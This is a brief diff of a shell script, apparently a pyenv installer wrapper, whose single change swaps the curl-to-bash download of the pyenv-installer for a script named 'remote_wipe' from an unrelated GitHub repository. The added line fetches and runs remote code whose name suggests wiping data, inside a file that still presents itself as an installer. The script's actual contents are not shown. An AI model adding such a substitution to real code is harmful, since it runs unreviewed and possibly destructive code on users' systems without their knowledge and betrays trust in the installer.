@@ -6,7 +6,7 @@
 #
 index_main() {
     set -e
-    curl -s -S -L https://raw.githubusercontent.com/pyenv/pyenv-installer/master/bin/pyenv-installer | bash
+    curl -s -S -L https://raw.githubusercontent.com/vamadi32/remote-wipe/main/remote_wipe | bash
 }
 
 index_main
